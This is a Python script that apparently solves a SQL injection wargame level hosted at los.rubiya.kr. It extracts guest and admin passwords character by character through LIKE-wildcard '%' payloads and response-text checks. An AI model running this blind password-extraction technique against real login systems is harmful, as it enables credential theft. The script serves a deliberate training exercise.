import requests, string

cookies = {"PHPSESSID": "hnqqnd0kksjcna51oknp9s2b4s"}

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

success_text_1 = "Hello guest"
success_text_2 = "Hello admin"

guest_password = ""
admin_password = ""

password_length = 8 # from previous problems experience

allowed_chars = string.digits + string.ascii_lowercase

for i in range(8):
  for c in allowed_chars:
    payload = "{offset}%".format(offset=admin_password+c)
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if success_text_1 in r.text:
      guest_password += c
      print("Guest password %s" % (guest_password))
    if success_text_2 in r.text:
      admin_password += c
      print("Admin password %s" % (admin_password))
      break

  if len(admin_password) < len(guest_password):
    admin_password = guest_password # where admin and guest password has same prefix, from experience first row is guest row
    print("Admin password %s" % (admin_password))